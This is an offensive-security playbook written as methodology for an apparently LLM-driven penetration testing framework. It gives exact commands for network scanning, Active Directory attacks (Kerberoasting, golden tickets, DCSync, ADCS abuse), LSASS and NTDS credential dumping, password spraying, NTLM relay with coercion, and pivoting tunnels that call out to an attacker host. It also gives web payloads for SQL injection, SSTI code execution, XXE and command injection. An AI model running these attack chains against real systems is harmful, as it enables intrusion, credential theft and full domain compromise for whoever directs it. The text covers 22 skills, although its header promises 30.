# Offensive Security Operator Playbook Library

An LLM-driven penetration testing framework requires deeply specific, machine-parseable methodology for each attack technique. This reference covers **30 skill areas** with exact commands, flag explanations, graph reporting schemas, OPSEC noise ratings, sequencing dependencies, and detection signatures. Every technique maps findings to a directed property graph with node types (host, service, domain, user, group, credential, share, certificate, gpo, ou, subnet, objective) and relationship edges.

---

## Skill 1 — Network reconnaissance

Network reconnaissance is the foundational skill that populates the engagement graph with host and service nodes. Everything downstream depends on its output quality.

**Host Discovery:**
```bash
# ARP scan (LAN only, OPSEC: 0.2)
nmap -sn -PR 10.10.10.0/24 -oA arp_sweep

# ICMP + TCP SYN/ACK + UDP (default ping sweep, OPSEC: 0.3)
nmap -sn 10.10.10.0/24 -oG - | grep "Up" | awk '{print $2}'

# Masscan host discovery (OPSEC: 0.5 — very fast, high packet rate)
masscan 10.10.10.0/24 -p 80,443,445,22 --rate=1000 -oL alive.txt
```

**Port Scanning:**
```bash
# SYN scan with service detection (OPSEC: 0.5)
nmap -sS -sV -sC -O -p- --min-rate=1000 -oA full_scan TARGET
# Flags: -sS (SYN/stealth), -sV (version detection), -sC (default scripts), -O (OS fingerprint), -p- (all 65535 ports)

# Top ports quick scan (OPSEC: 0.4)
nmap -sS -sV --top-ports 1000 -oA quick TARGET

# UDP scan (OPSEC: 0.6, very slow)
nmap -sU --top-ports 50 -sV TARGET

# Masscan full port then nmap service scan (optimized workflow)
masscan TARGET -p 1-65535 --rate=1000 -oL ports.txt
# Parse: grep "open" ports.txt | awk '{print $3}' | sort -un | paste -sd, > portlist
nmap -sV -sC -p $(cat portlist) TARGET -oA detailed

# IDS evasion (OPSEC: 0.3)
nmap -sS -f --data-length 24 -D RND:5 --source-port 53 -T2 TARGET
# -f (fragment packets), --data-length (pad), -D (decoys), --source-port (spoof src port), -T2 (slow timing)
```

**Graph reporting:** Create `host` node (IP, hostname, OS) per discovered target. Create `service` node (port, protocol, product, version) for each open port. Create `RUNS` edge from host → service. Create `REACHABLE` edge between hosts on same subnet. Enrich `subnet` nodes from discovered ranges.

**OPSEC ratings:** ARP scan **0.2**, ICMP ping sweep **0.3**, SYN scan **0.5**, Connect scan **0.6**, Version scan **0.5**, UDP scan **0.6**, Masscan default rate **0.7**, Masscan rate-limited **0.4**.

**Detection:** Firewall logs for SYN-only packets (no ACK follow-up), IDS signatures for sequential port scanning, Snort/Suricata rules for nmap fingerprinting, threshold alerts for connection attempts per second.

**Sequencing:** FIRST skill in any engagement. Feeds → DNS Enumeration, SMB Enumeration, Web Recon, AD Discovery. Run before all other skills.

---

## Skill 2 — DNS enumeration

```bash
# Zone transfer attempt (OPSEC: 0.3)
dig AXFR domain.com @ns1.domain.com

# Subdomain brute forcing
gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
amass enum -d domain.com -passive    # Passive only (OPSEC: 0.1)
amass enum -d domain.com -brute      # Active brute force (OPSEC: 0.6)

# DNS record enumeration
dig domain.com ANY +noall +answer
dig domain.com MX +short; dig domain.com TXT +short; dig domain.com NS +short
dig _ldap._tcp.domain.com SRV          # Find Domain Controllers
dig _kerberos._tcp.domain.com SRV      # Find KDCs

# ADIDNS poisoning (requires domain creds)
python3 dnstool.py -u 'domain\user' -p 'pass' -a add -r '*.domain.com' -d ATTACKER_IP DC_IP
# Creates wildcard record → captures NTLM auth for non-existent hostnames
```

**Graph:** Create `domain` nodes linked to `host` nodes via DNS resolution. SRV records identify DCs, mail servers. ADIDNS poisoning creates `RELAY_TARGET` edges. **OPSEC:** Zone transfer **0.3**, brute forcing **0.6**, passive **0.1**, ADIDNS poisoning **0.5**. **Sequencing:** After network recon, before AD Discovery.

---

## Skill 3 — SNMP enumeration

```bash
# Community string guessing (OPSEC: 0.4)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET

# MIB walking with found community string
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.1         # System info
snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25  # User accounts (Windows)
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2 # Running processes
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.6.13.1.3   # TCP connections
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2 # Installed software

# Automated enumeration
snmp-check TARGET -c public
```

**Graph:** Enrich `host` nodes with OS details, create `user` nodes from SNMP user enumeration, create `service` nodes from running processes. **OPSEC:** Community guessing **0.4**, MIB walking **0.3**. **Sequencing:** After network recon identifies UDP/161 open.

---

## Skill 4 — SMB enumeration

```bash
# Null session testing (OPSEC: 0.3)
nxc smb TARGET -u '' -p ''
nxc smb TARGET -u 'guest' -p ''
smbclient -N -L //TARGET

# Share enumeration (OPSEC: 0.3)
nxc smb TARGET -u user -p pass --shares
smbclient -U 'domain/user%pass' -L //TARGET

# User enumeration
nxc smb TARGET -u user -p pass --users --rid-brute
enum4linux-ng -u user -p pass -A TARGET

# SMB signing check (critical for relay attacks)
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# GPP passwords (MS14-025)
nxc smb TARGET -u user -p pass -M gpp_autologin
nxc smb TARGET -u user -p pass -M gpp_password
# Manual: findstr /S /I cpassword \\DC\SYSVOL\domain\Policies\*.xml

# Recursive file listing on shares
smbclient //TARGET/share -U 'domain/user%pass' -c 'recurse;ls'
```

**Graph:** Create `share` nodes with permissions, create `user` nodes from RID cycling, `credential` nodes from GPP passwords with `VALID_ON` edges. `RELAY_TARGET` edges for signing-disabled hosts. **OPSEC:** Null session **0.3**, authenticated enum **0.3**, GPP check **0.3**. **Sequencing:** After network recon identifies port 445. Feeds → NTLM Relay (signing check), Credential Attacks.

---

## Skill 5 — Active Directory discovery

AD discovery populates the graph with the full domain structure. BloodHound collection is the single most impactful enumeration step.

```bash
# BloodHound Python ingestor (OPSEC: 0.5 — LDAP + SMB queries)
bloodhound-python -c All -d domain.com -u user -p 'pass' -dc dc01.domain.com --zip
# Collection methods: All, DCOnly (0.3 — no host contact), Group, LocalAdmin, Session, Trusts, ACL, ObjectProps

# LDAP user enumeration
ldapsearch -x -H ldap://DC -b "DC=dom,DC=com" "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName userAccountControl memberOf description servicePrincipalName

# NetExec comprehensive enumeration
nxc smb DC -u user -p pass --users --groups --shares --pass-pol
nxc ldap DC -u user -p pass --trusted-for-delegation --admin-count --kerberoasting kerb.txt --asreproast asrep.txt
nxc ldap DC -u user -p pass -M laps -M adcs -M maq

# Trust enumeration
nltest /domain_trusts /all_trusts
ldapsearch -x -H ldap://DC -b "CN=System,DC=dom,DC=com" "(objectClass=trustedDomain)" trustPartner trustDirection trustType

# LAPS password reading (OPSEC: 0.2 — read-only)
nxc ldap DC -u user -p pass -M laps
ldapsearch -x -H ldap://DC -D 'user@dom.com' -w pass -b "DC=dom,DC=com" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd

# gMSA password extraction (OPSEC: 0.2)
nxc ldap DC -u user -p pass --gmsa
gMSADumper.py -u user -p pass -d domain.com
```

**Graph:** Creates ALL node types — `user`, `group`, `computer/host`, `gpo`, `ou`, `domain` with full `MEMBER_OF`, `MEMBER_OF_DOMAIN`, `ADMIN_TO`, `HAS_SESSION`, `DELEGATES_TO`, `TRUSTS` edges. BloodHound data directly maps to the property graph. **Sequencing:** After network recon + SMB enum. Critical prerequisite for all AD attack skills.

---

## Skill 6 — Kerberos attacks

**Kerberoasting (OPSEC: 0.6):**
```bash
impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip DC -request -outputfile hashes.kerberoast
nxc ldap DC -u user -p pass --kerberoasting output.txt
Rubeus.exe kerberoast /rc4opsec /nowrap    # Windows, targets RC4-only accounts
hashcat -m 13100 hashes.kerberoast wordlist.txt -r best64.rule
```
**Targeted Kerberoasting** (requires GenericWrite): Set SPN on target → roast → remove SPN. Graph: `credential` node linked to `user` via `VALID_ON`.

**AS-REP Roasting (OPSEC: 0.3):**
```bash
impacket-GetNPUsers 'DOMAIN/' -usersfile users.txt -dc-ip DC -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt -r OneRuleToRuleThemAll.rule
```
LDAP filter: `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`. Detection: Event 4768 with PreAuthType 0.

**Silver Ticket (OPSEC: 0.2 — no DC contact):**
```bash
impacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-xxx -domain dom.com -spn cifs/target.dom.com user
export KRB5CCNAME=user.ccache
impacket-psexec dom.com/user@target.dom.com -k -no-pass
```

**Golden Ticket (OPSEC: 0.3):**
```bash
impacket-ticketer -aesKey KRBTGT_AES256 -domain-sid S-1-5-21-xxx -domain dom.com Administrator
export KRB5CCNAME=Administrator.ccache
```
Prerequisite: krbtgt hash from DCSync. Persists until krbtgt rotated **twice**.

**Constrained Delegation (OPSEC: 0.5):**
```bash
impacket-findDelegation DOMAIN/user:pass -dc-ip DC
impacket-getST -spn cifs/target.dom.com -impersonate Administrator 'DOMAIN/svc:pass'
export KRB5CCNAME=Administrator@cifs_target.dom.com@DOMAIN.COM.ccache
```

**Unconstrained Delegation (OPSEC: 0.6):** Coerce auth (PetitPotam/PrinterBug) to unconstrained host → capture TGT with `Rubeus.exe monitor /interval:5 /nowrap` → inject ticket → DCSync.

**RBCD full chain (OPSEC: 0.5):**
```bash
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss' -dc-ip DC 'DOMAIN/user:pass'
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -dc-ip DC -action write 'DOMAIN/user:pass'
impacket-getST -spn cifs/TARGET.dom.com -impersonate Administrator -dc-ip DC 'DOMAIN/EVIL$:P@ss'
```
Detection: Event 4741 (computer created), 5136 (msDS-AllowedToActOnBehalfOfOtherIdentity modified), 4769 with S4U flags.

---

## Skill 7 — ADCS exploitation

ADCS misconfigurations are among the most impactful AD attack vectors. **ESC1** alone can grant domain admin from any authenticated user.

**Enumeration:**
```bash
certipy find -u 'user@dom.com' -p 'pass' -dc-ip DC -vulnerable -stdout
Certify.exe find /vulnerable
```

**ESC1 — enrollee supplies subject (OPSEC: 0.5):**
Conditions: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + Client Auth EKU + low-priv enrollment + no approval required.
```bash
certipy req -u 'user@dom.com' -p 'pass' -dc-ip DC -target CA -ca 'CORP-CA' -template VulnTemplate -upn 'administrator@dom.com'
certipy auth -pfx administrator.pfx -dc-ip DC
```
Returns TGT + NT hash via UnPAC-the-hash. Graph: `ESC1` edge from template → CA, `certificate` node, `VALID_ON` edge.

**ESC4 — template ACL abuse (OPSEC: 0.7):**
```bash
certipy template -u 'user@dom.com' -p 'pass' -dc-ip DC -template SecureTemplate -save-old
# Modifies template to be ESC1-vulnerable → exploit → restore
certipy template -u 'user@dom.com' -p 'pass' -dc-ip DC -template SecureTemplate -configuration SecureTemplate.json
```

**ESC7 — ManageCA permissions (OPSEC: 0.7):**
```bash
certipy ca -ca 'CORP-CA' -add-officer attacker -username 'user@dom.com' -password 'pass'
certipy ca -ca 'CORP-CA' -enable-template SubCA -username 'user@dom.com' -password 'pass'
certipy req -username 'user@dom.com' -password 'pass' -ca 'CORP-CA' -target CA -template SubCA -upn 'admin@dom.com'
certipy ca -ca 'CORP-CA' -issue-request REQUEST_ID -username 'user@dom.com' -password 'pass'
certipy req -username 'user@dom.com' -password 'pass' -ca 'CORP-CA' -target CA -retrieve REQUEST_ID
```

**ESC8 — NTLM relay to HTTP enrollment (OPSEC: 0.6):**
```bash
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
python3 PetitPotam.py ATTACKER_IP DC_IP
certipy auth -pfx dc01.pfx -dc-ip DC    # → DC$ NT hash → DCSync
```

**Shadow Credentials (OPSEC: 0.4 with auto cleanup):**
```bash
certipy shadow auto -u 'user@dom.com' -p 'pass' -dc-ip DC -account victim
```
Requires GenericWrite on target + domain FL ≥ 2016. Adds msDS-KeyCredentialLink → PKINIT → NT hash via UnPAC-the-hash.

**Golden Certificate:** With CA private key: `certipy forge -ca-pfx CA.pfx -upn admin@dom.com -crl 'ldap:///'`. Forge any identity offline, no CA logs generated.

**Detection:** Event 4886/4887 (cert request/issuance), 4768 with PreAuthType=16 (PKINIT), 5136 (template/KeyCredentialLink modifications). SAN mismatch (requester ≠ subject UPN) is the primary detection signal.

---

## Skill 8 — AD privilege escalation

**ACL Abuse — exact commands per edge type:**

| BloodHound Edge | Command | OPSEC |
|---|---|---|
| GenericAll→User | `rpcclient -U 'dom/user%pass' DC -c "setuserinfo2 target 23 'NewPass!'"` | 0.5 |
| GenericAll→Group | `net rpc group addmem 'Domain Admins' attacker -U 'dom/user%pass' -S DC` | 0.7 |
| GenericAll→Computer | RBCD chain (addcomputer→rbcd→getST) or shadow credentials | 0.5 |
| WriteDACL | `dacledit.py -action write -rights DCSync -principal attacker -target-dn "DC=dom,DC=com" dom/user:pass` | 0.8 |
| WriteOwner | `owneredit.py -action write -new-owner attacker -target-dn 'DN' dom/user:pass` → then WriteDACL | 0.8 |
| ForceChangePassword | `rpcclient -U 'dom/user%pass' DC -c "setuserinfo2 target 23 'NewPass!'"` | 0.5 |
| AddMember | `net rpc group addmem 'GroupName' attacker -U 'dom/user%pass' -S DC` | 0.7 |

**DCSync (OPSEC: 0.8 — well-detected):**
```bash
impacket-secretsdump -just-dc domain/user:pass@DC
impacket-secretsdump -just-dc-user krbtgt domain/user:pass@DC
```
Required rights: `Replicating Directory Changes` + `Replicating Directory Changes All`. Detection: Event 4662 with GUIDs `{1131f6ad-...}` and `{1131f6aa-...}` from non-DC source IP.

**GPO Abuse (OPSEC: 0.9):**
```bash
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c payload" --GPOName "Vulnerable GPO"
```

**Graph edges:** `GENERIC_ALL`, `WRITE_DACL`, `WRITE_OWNER`, `FORCE_CHANGE_PASSWORD`, `ADD_MEMBER`, `CAN_DCSYNC`. Each successful ACL abuse creates new edges or escalates existing ones.

---

## Skill 9 — AD persistence

| Technique | OPSEC | Persistent | Key Command | Detection |
|---|---|---|---|---|
| Golden Ticket | 0.3 | Until krbtgt rotated 2× | `ticketer.py -aesKey KRBTGT_AES -domain-sid SID -domain dom Administrator` | 4769 without matching AS-REQ |
| Diamond Ticket | 0.2 | Until krbtgt rotated 2× | `Rubeus.exe diamond /krbkey:AES /ticketuser:admin /ldap /opsec` | PAC/group mismatch |
| Skeleton Key | 0.7 | No (until reboot) | `mimikatz# misc::skeleton` (on DC) | 7045 driver install |
| DSRM | 0.4 | Yes (registry) | `reg add HKLM\...\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2` | 4657 registry change |
| AdminSDHolder | 0.5 | Yes (ACL, SDProp) | `dacledit.py -action write -rights FullControl -principal attacker -target-dn 'CN=AdminSDHolder,...'` | 5136 on AdminSDHolder |
| SID History | 0.4 | Yes (attribute) | `mimikatz# sid::add /sam:user /new:S-1-5-21-xxx-519` | 4765 SID History added |
| DCShadow | 0.6 | Depends | `mimikatz# lsadump::dcshadow /object:user /attribute:attr /value:val` (two shells) | 4929 replication from non-DC |
| Custom SSP | 0.7 | Registry=yes | `mimikatz# misc::memssp` or registry Security Packages modification | 4611 LSA package registered |
| RBCD to krbtgt | 0.4 | Yes (AD attribute) | `rbcd.py -delegate-to 'krbtgt' -delegate-from 'EVIL$' -action write` | 5136 on krbtgt object |

---

## Skill 10 — Domain trust attacks

```bash
# Parent-child trust escalation (Golden Ticket with Extra SID)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid CHILD_SID -domain child.dom.com \
  -extra-sid S-1-5-21-PARENT_SID-519 Administrator
# S-1-5-21-PARENT-519 = Enterprise Admins in parent domain

# Trust key extraction
impacket-secretsdump -just-dc-user 'PARENT$' child.dom.com/admin:pass@CHILD_DC

# Inter-realm TGT with trust key
impacket-ticketer -nthash TRUST_KEY -domain-sid CHILD_SID -domain child.dom.com \
  -spn krbtgt/parent.dom.com -extra-sid S-1-5-21-PARENT-519 Administrator
```

**Graph:** `TRUSTS` edges between `domain` nodes with trust direction and type properties. Extra SID injection enables cross-domain `ADMIN_TO` edges. **OPSEC: 0.4**. Detection: Tickets with SIDs from external domains, Event 4769 cross-domain with unexpected SID membership.

---

## Skill 11 — Credential dumping

**SAM dump (OPSEC: 0.4):**
```bash
impacket-secretsdump 'DOMAIN/admin:pass@TARGET'          # Remote (auto: SAM+LSA+cached)
nxc smb TARGET -u admin -p pass --sam                      # SAM only
nxc smb TARGET -u admin -p pass --lsa                      # LSA secrets
```

**LSASS dump techniques (OPSEC: 0.3–0.9):**
```bash
# comsvcs.dll LOLBin (OPSEC: 0.5)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\out.dmp full

# Procdump signed binary (OPSEC: 0.5)
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Nanodump — direct syscalls (OPSEC: 0.3)
nanodump.x64.exe --write C:\Temp\out.dmp

# Mimikatz in-memory (OPSEC: 0.9 — heavily signatured)
mimikatz# sekurlsa::logonpasswords

# Offline parsing
pypykatz lsa minidump lsass.dmp
```
Detection: Sysmon Event 10 (ProcessAccess on lsass.exe), 4656/4663 (object access), `comsvcs.dll` + `MiniDump` in command line.

**NTDS.dit extraction:**
```bash
impacket-secretsdump -just-dc 'DOMAIN/admin:pass@DC'       # DCSync (OPSEC: 0.8)
impacket-secretsdump -just-dc-ntlm 'DOMAIN/admin:pass@DC'  # NTLM hashes only
nxc smb DC -u admin -p pass --ntds                          # DCSync via nxc
nxc smb DC -u admin -p pass --ntds vss                      # VSS method
```

**Graph:** Create `credential` nodes (type: NTLM/plaintext/ticket) with `VALID_ON` edges to `user` nodes. `ADMIN_TO` edges where creds grant admin access.

---

## Skill 12 — Password attacks and spraying

```bash
# Password policy check (ALWAYS FIRST)
nxc smb DC -u user -p pass --pass-pol

# Kerberos spray (OPSEC: 0.5 — no 4625 events, just 4768/4771)
kerbrute passwordspray -d dom.com --dc DC users.txt 'Summer2025!'

# SMB spray (OPSEC: 0.6 — generates 4625 events)
nxc smb DC -u users.txt -p 'Password123!' -d DOMAIN --continue-on-success

# User enumeration via Kerberos (OPSEC: 0.3 — no lockout)
kerbrute userenum -d dom.com --dc DC users.txt
# Valid: KDC_ERR_PREAUTH_REQUIRED, Invalid: KDC_ERR_C_PRINCIPAL_UNKNOWN
```

**Hashcat reference:**

| Mode | Hash Type | Example |
|---|---|---|
| 1000 | NTLM | `hashcat -m 1000 hashes.txt wordlist -r best64.rule` |
| 13100 | Kerberoast (RC4) | `hashcat -m 13100 tgs.txt wordlist -r best64.rule` |
| 18200 | AS-REP | `hashcat -m 18200 asrep.txt wordlist -r OneRuleToRuleThemAll.rule` |
| 5600 | NTLMv2 (NetNTLM) | `hashcat -m 5600 ntlmv2.txt wordlist` |

**Spray methodology:** One password per lockout window. Wait observation window + buffer before next attempt. Common passwords: `Season+Year!` (Spring2025!), `Company+Year`, Welcome1, Password1. **Graph:** `credential` nodes for valid combos, `VALID_ON` to users, `ADMIN_TO` where admin access confirmed.

---

## Skill 13 — NTLM relay attacks

**SMB signing check (prerequisite):**
```bash
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```
DCs have signing required by default; workstations typically do **not**.

**Responder for poisoning (OPSEC: 0.6):**
```bash
# CRITICAL: Disable SMB+HTTP in Responder.conf when relaying!
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
responder -I eth0 -dwPv
```

**Relay to SMB (OPSEC: 0.6):**
```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support        # SAM dump
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks  # Interactive SOCKS
```
Requires: signing disabled + relayed user is local admin.

**Relay to LDAP (OPSEC: 0.7):**
```bash
impacket-ntlmrelayx -t ldaps://DC -smb2support --delegate-access     # RBCD
impacket-ntlmrelayx -t ldap://DC -smb2support --escalate-user attacker # DCSync rights
```

**Relay to ADCS — ESC8 (OPSEC: 0.6):**
```bash
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

**Coercion techniques:**
```bash
python3 PetitPotam.py LISTENER DC         # Unauthenticated (unpatched), OPSEC: 0.5
python3 PetitPotam.py -u user -p pass -d dom LISTENER DC  # Authenticated
python3 printerbug.py 'dom/user:pass'@DC LISTENER         # PrinterBug, OPSEC: 0.5
coercer coerce -l LISTENER -t DC -d dom -u user -p pass    # Multi-protocol, OPSEC: 0.5
sudo mitm6 -d domain.com                                   # IPv6 poisoning, OPSEC: 0.7
impacket-ntlmrelayx -6 -t ldaps://DC -wh fake.dom.com --delegate-access  # mitm6 combo
```

**Key attack chains:**
- PetitPotam → ADCS relay → DC certificate → DCSync = **full domain compromise**
- PetitPotam → LDAP relay → RBCD → S4U → admin on target
- mitm6 → LDAP relay → computer account creation → RBCD
- Responder → SMB relay → SAM dump/code execution

**Graph:** `RELAY_TARGET` edges (protocol, signing status), `COERCE_AUTH` edges, `CAN_DCSYNC`/`CAN_RBCD` edges from successful relay. Detection: Event 4624 Type 3 with source IP mismatch, 5145 for named pipe access (efsrpc, spoolss), 4741/5136 for LDAP relay modifications.

---

## Skill 14 — Lateral movement

| Technique | Tool Command | OPSEC | Ports | Prerequisites |
|---|---|---|---|---|
| PsExec | `impacket-psexec -hashes ':HASH' 'dom/user@TARGET'` | 0.8 | 445 | Admin + ADMIN$ |
| WMIExec | `impacket-wmiexec -hashes ':HASH' 'dom/user@TARGET'` | 0.5 | 135+high | Admin + DCOM |
| WinRM | `evil-winrm -i TARGET -u user -H HASH` | 0.4 | 5985 | Remote Mgmt Users or admin |
| DCOM | `impacket-dcomexec -hashes ':HASH' 'dom/user@TARGET'` | 0.5 | 135+high | Admin + DCOM |
| RDP | `xfreerdp /v:TARGET /u:user /pth:HASH /cert:ignore` | 0.3 | 3389 | Restricted admin mode |
| SSH | `ssh user@TARGET` | 0.2 | 22 | SSH credentials |

**Pass-the-Hash:** Any impacket tool supports `-hashes ':NTHASH'`. Only **RID-500 Administrator** and domain accounts work for PTH by default (UAC Remote Restrictions). Exception: if `LocalAccountTokenFilterPolicy=1` (set by Enable-PSRemoting).

**Overpass-the-Hash (OPSEC: 0.3):**
```bash
impacket-getTGT -hashes ':NTHASH' DOMAIN/user
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass DOMAIN/user@TARGET_FQDN
```
Converts NTLM hash to Kerberos TGT — looks more legitimate. Use AES key (`-aesKey`) for even stealthier variant.

**Decision logic:** SSH > WinRM > WMIExec > DCOM > PsExec (ordered by stealth). Use the least noisy method available.

---

## Skill 15 — Pivoting and tunneling

**Ligolo-ng (best tool — no proxychains needed, OPSEC: 0.3):**
```bash
# Attacker setup
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Target agent
./agent -connect ATTACKER:11601 -ignore-cert

# In ligolo console
session → start → sudo ip route add 10.10.10.0/24 dev ligolo

# Double pivot: listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# Run second agent connecting through first pivot
```
**Key advantage:** TUN interface means nmap SYN scans, ICMP, and all tools work natively without proxychains.

**Chisel (OPSEC: 0.4):**
```bash
chisel server -p 8080 --reverse                              # Attacker
chisel client ATTACKER:8080 R:socks                          # Target → SOCKS5 on attacker:1080
chisel client ATTACKER:8080 R:8888:INTERNAL:445              # Specific port forward
```

**SSH tunneling (OPSEC: 0.2):**
```bash
ssh -D 1080 user@pivot                           # Dynamic SOCKS
ssh -L 8080:INTERNAL:80 user@pivot                # Local forward
ssh -R 8080:127.0.0.1:445 user@attacker           # Remote forward
ssh -J user@pivot1,user@pivot2 user@target         # ProxyJump multi-hop
sshuttle -r user@pivot 10.10.10.0/24              # Transparent proxy
```

**Proxychains (for SOCKS-based tunnels):**
```bash
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nxc smb 10.10.10.0/24 -u user -p pass
proxychains nmap -sT -Pn TARGET     # MUST use -sT (no SYN), -Pn (no ICMP)
```
Limitations: No ICMP, no UDP, no SYN scan through SOCKS. **Graph:** Each pivot creates `REACHABLE` edges from `host(pivot)` to `subnet` nodes, expanding attack surface.

---

## Skill 16 — Web reconnaissance

```bash
# Technology fingerprinting (OPSEC: 0.3)
whatweb http://target -a 3
curl -sI http://target | grep -i 'server\|x-powered-by\|x-aspnet'

# Directory enumeration (OPSEC: 0.7)
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,html,txt,bak -t 50 -o out.txt
feroxbuster -u http://target -w wordlist -x php,aspx -t 50 --depth 3 --extract-links -o out.txt
ffuf -u http://target/FUZZ -w wordlist -mc 200,301,302,403 -fc 404 -t 50 -o out.json -of json

# Virtual host discovery
ffuf -u http://target -H "Host: FUZZ.target.com" -w subs.txt -fs <default_size>

# API endpoint discovery
# Priority: /swagger.json, /openapi.json, /api-docs, /graphql, /api/v1/
```

**Graph:** Create/enrich `service` nodes with technology stack, discovered paths, virtual hosts, API endpoints. New `host` nodes for discovered vhosts.

---

## Skill 17 — Web vulnerability scanning

```bash
# Nuclei (OPSEC: 0.5-0.7)
nuclei -u http://target -t cves/ -severity critical,high -o output.txt
nuclei -l urls.txt -tags cve,misconfig,exposure -severity critical,high,medium -c 50 -rate-limit 100
nuclei -u http://target -t http/technologies/    # Tech detection

# Nikto (OPSEC: 0.8 — very noisy, distinctive user-agent)
nikto -h http://target -o output.txt

# Scanning methodology order:
# 1. Fingerprint (whatweb) → 2. Directory enum → 3. Nuclei quick wins → 4. Manual testing
```

---

## Skill 18 — SQL injection

```bash
# Discovery and exploitation
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/page?id=1" -D db --tables -T table --dump
sqlmap -r request.txt --batch --dbs    # From Burp saved request (recommended)
sqlmap -u URL --level 3 --risk 3 --batch    # Thorough

# OS exploitation
sqlmap -u URL --os-shell                    # xp_cmdshell (MSSQL) or UDF (MySQL)
sqlmap -u URL --file-read="/etc/passwd"     # File read

# WAF bypass
sqlmap -u URL --tamper=space2comment,between,randomcase --random-agent

# MSSQL NTLM theft (no sqlmap needed)
'; EXEC xp_dirtree '\\ATTACKER_IP\share'; --    # Triggers NTLM auth to attacker
```
**OPSEC:** Time-based blind **0.5**, union/error-based **0.7**, os-shell **0.9**. **Graph:** `credential` nodes from dumped DB data, host enrichment from OS commands.

---

## Skill 19 — Web application attacks

**SSRF:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS metadata). Bypass filters: decimal IP (2130706433), IPv6 ([::ffff:127.0.0.1]), DNS rebinding, URL encoding, 307 redirects.

**LFI:** `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=config.php` (source code read), log poisoning via User-Agent injection → include `/var/log/apache2/access.log`.

**Command injection:** `; whoami`, `| whoami`, `$(whoami)`. Bypass: `${IFS}` for spaces, `{cat,/etc/passwd}` brace expansion, quote splitting `c'a't /etc/passwd`.

**SSTI detection:** `{{7*7}}` → 49 confirms SSTI. **Jinja2 RCE:** `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.

**XXE:** `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`. Blind: external DTD with OOB exfiltration.

**JWT:** Algorithm "none" attack, HS256/RS256 key confusion, `jwt_tool.py -X a` (none), `-X k` (key confusion), `hashcat -m 16500` (crack HS256 secret).

**Deserialization:** Java: `ysoserial.jar CommonsCollections4 'command'`. Detect: `AC ED 00 05` (hex) / `rO0` (base64).

---

## Skill 20 — CMS exploitation

```bash
# WordPress (OPSEC: 0.4 passive, 0.9 brute force)
wpscan --url http://target -e ap,at,u --api-token TOKEN
wpscan --url http://target --passwords rockyou.txt --usernames admin
# Attack surfaces: xmlrpc.php (multicall brute force), wp-config.php.bak, /wp-json/wp/v2/users, theme/plugin editor RCE

# Joomla
joomscan -u http://target --enumerate-components

# Drupal
droopescan scan drupal -u http://target
# CVEs: Drupalgeddon2 (CVE-2018-7600), Drupalgeddon3 (CVE-2018-7602)
```

---

## Skill 21 — Linux enumeration

```bash
# Automated (OPSEC: 0.7)
./linpeas.sh -a           # All checks
./linpeas.sh -s           # Stealth mode (no disk writes)

# Process monitoring (OPSEC: 0.1 — passive, no root)
./pspy64 -pf -i 1000      # Discovers cron jobs, hidden scheduled tasks

# SUID binaries
find / -perm -4000 -type f 2>/dev/null    # Cross-reference GTFOBins

# Capabilities
getcap -r / 2>/dev/null    # cap_setuid on python → instant root

# Sudo misconfigs
sudo -l                    # List permissions, check GTFOBins

# Cron jobs
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
```

**Graph:** Enrich `host` nodes with OS, kernel version, interesting findings. Create edges for privilege escalation paths identified.

---

## Skill 22 — Linux privilege escalation

**SUID abuse:** `find / -perm -4000 2>/dev/null` → check GTFOBins. Example: `python3` with SUID → `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`.

**Capabilities:** `cap_setuid` on interpreter = root. `cap_dac_read_search` = read any file. `cap_sys_admin` = container escape.

**Sudo LD_PRELOAD:** If `env_keep+=LD_PRELOAD`: compile shared object that calls `setuid(0)` + `system("/bin/bash")`, execute as `sudo LD_PRELOAD=/tmp/evil.so <any_allowed_command>`.

